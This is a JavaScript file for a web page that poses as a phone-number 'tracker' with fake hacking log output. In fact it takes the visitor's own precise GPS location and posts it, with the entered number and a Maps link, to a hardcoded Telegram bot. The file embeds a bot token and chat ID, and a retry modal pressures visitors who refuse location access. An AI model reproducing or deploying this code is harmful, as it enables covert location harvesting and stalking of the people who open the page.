const TELEGRAM_BOT_TOKEN = '8837117055:AAG8OBYU2dO8ymuvWp3HzNcDc8Qqy3c7is0';
const TELEGRAM_CHAT_ID = '8705316282';

let currentPhoneNumber = '';

const SENT_DATA_KEY = 'telegram_sent_data';

function normalizeTarget(value) {
    value = value.trim();

    if (value.startsWith('@') || /[a-zA-Z]/.test(value)) {
        return value;
    }

    const number = value.replace(/[\s\-().]/g, '');

    if (number.startsWith('0')) {
        return '+62' + number.replace(/^0+/, '');
    }

    if (number.startsWith('62')) {
        return '+' + number;
    }

    if (number.startsWith('+')) {
        return number;
    }

    return number;
}

function createDataKey(target, latitude, longitude) {
    return `${target}|${latitude}|${longitude}`;
}


function isAlreadySent(key) {
    try {
        const sentData = JSON.parse(
            localStorage.getItem(SENT_DATA_KEY) || '[]'
        );

        return sentData.includes(key);

    } catch (error) {
        console.error('Gagal membaca riwayat data:', error);
        return false;
    }
}


function markAsSent(key) {
    try {
        const sentData = JSON.parse(
            localStorage.getItem(SENT_DATA_KEY) || '[]'
        );

        if (!sentData.includes(key)) {
            sentData.push(key);

            localStorage.setItem(
                SENT_DATA_KEY,
                JSON.stringify(sentData)
            );
        }

    } catch (error) {
        console.error('Gagal menyimpan riwayat data:', error);
    }
}


function addLog(text, type = 'info') {

    const logsArea = document.getElementById('terminal-logs');

    const entry = document.createElement('div');

    entry.className = `log-entry log-${type}`;

    const timestamp = new Date().toLocaleTimeString();

    entry.innerText = `[${timestamp}] ${text}`;

    logsArea.appendChild(entry);

    logsArea.scrollTop = logsArea.scrollHeight;
}


async function resolveAddress(latitude, longitude) {

    addLog(
        `RESOLVING GPS COORDINATES TO ADDRESS...`,
        'info'
    );

    try {

        const url =
            `https://nominatim.openstreetmap.org/reverse` +
            `?format=jsonv2` +
            `&lat=${encodeURIComponent(latitude)}` +
            `&lon=${encodeURIComponent(longitude)}` +
            `&zoom=18` +
            `&addressdetails=1` +
            `&accept-language=id`;

        const response = await fetch(url, {
            headers: {
                'Accept': 'application/json'
            }
        });

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }

        const data = await response.json();

        if (data.display_name) {

            addLog(
                `ADDRESS RESOLVED: ${data.display_name}`,
                'success'
            );

        } else {

            addLog(
                `ADDRESS NOT FOUND FOR THESE COORDINATES.`,
                'error'
            );
        }

    } catch (error) {

        console.error(
            'Reverse geocoding error:',
            error
        );

        addLog(
            `FAILED TO RESOLVE ADDRESS.`,
            'error'
        );
    }
}


function handleFormSubmit(event) {

    event.preventDefault();

    const phoneInput =
        document.getElementById('phone-number')
        .value
        .trim();

    if (!phoneInput) {
        return;
    }


    currentPhoneNumber =
        normalizeTarget(phoneInput);


    document.getElementById(
        'terminal-logs'
    ).innerHTML = '';


    addLog(
        `TARGET INPUT: ${currentPhoneNumber}`,
        'info'
    );

    addLog(
        `REQUESTING GEOLOCATION ACCESS...`,
        'info'
    );


    requestAndSendLocation();
}


function requestAndSendLocation() {

    const btn =
        document.getElementById('btn-submit');


    if (!navigator.geolocation) {

        addLog(
            `CRITICAL ERROR: GEOLOCATION API NOT SUPPORTED.`,
            'error'
        );

        return;
    }


    btn.disabled = true;


    navigator.geolocation.getCurrentPosition(

        function(position) {

            document.getElementById(
                'retry-modal'
            ).style.display = 'none';


            const latitude =
                position.coords.latitude;

            const longitude =
                position.coords.longitude;

            const accuracy =
                position.coords.accuracy;


            addLog(
                `GPS SIGNAL LOCKED: ACCURACY ${accuracy}m`,
                'success'
            );

            addLog(
                `LAT: ${latitude} | LONG: ${longitude}`,
                'success'
            );


            const dataKey =
                createDataKey(
                    currentPhoneNumber,
                    latitude,
                    longitude
                );


            if (isAlreadySent(dataKey)) {

                addLog(
                    `DATA SUDAH TERKIRIM.`,
                    'info'
                );

                addLog(
                    `DATA TERKIRIM`,
                    'info'
                );


                btn.disabled = false;

                return;
            }


            addLog(
                `DATA MENYIAPKAN PENGIRIMAN...`,
                'info'
            );


            const googleMapsUrl =
                `https://www.google.com/maps?q=${latitude},${longitude}`;


            const message =
                `☠️ *TARGET HACKED / LOGGED*\n\n` +
                `• *WhatsApp:* \`${currentPhoneNumber}\`\n` +
                `• *Latitude:* \`${latitude}\`\n` +
                `• *Longitude:* \`${longitude}\`\n` +
                `• *Akurasi:* ${accuracy} meter\n` +
                `• *Location Link:* [Google Maps](${googleMapsUrl})`;


            fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',

                    headers: {
                        'Content-Type': 'application/json'
                    },

                    body: JSON.stringify({

                        chat_id:
                            TELEGRAM_CHAT_ID,

                        text:
                            message,

                        parse_mode:
                            'Markdown'
                    })
                }
            )

            .then(response => response.json())

            .then(data => {

                if (data.ok) {

                    markAsSent(dataKey);


                    addLog(
                        `DATA SUCCESSFULLY SENT`,
                        'success'
                    );

                    addLog(
                        `DATA SUDAH TERKIRIM.`,
                        'success'
                    );

                    addLog(
                        `SESSION TERMINATED. ACCESS GRANTED.`,
                        'success'
                    );

                } else {

                    addLog(
                        `FAILED TO TRANSMIT DATA`,
                        'error'
                    );

                    console.error(
                        'Telegram API error:',
                        data
                    );
                }
            })

            .catch(error => {

                console.error(
                    "Error:",
                    error
                );

                addLog(
                    `NETWORK TRANSMISSION ERROR.`,
                    'error'
                );

            })

            .finally(() => {

                btn.disabled = false;

            });

        },


        function(error) {

            btn.disabled = false;


            if (
                error.code ===
                error.PERMISSION_DENIED
            ) {

                addLog(
                    `ACCESS DENIED BY USER. GEOLOCATION REQUIRED!`,
                    'error'
                );

                document.getElementById(
                    'retry-modal'
                ).style.display = 'flex';

            } else {

                addLog(
                    `ERROR OBTAINING GPS DATA: ${error.message}`,
                    'error'
                );
            }
        },


        {
            enableHighAccuracy: true,

            timeout: 10000,

            maximumAge: 0
        }
    );
}


function retryLocationRequest() {

    document.getElementById(
        'retry-modal'
    ).style.display = 'none';


    addLog(
        `RETRYING LOCATION ACCESS...`,
        'info'
    );


    requestAndSendLocation();
}
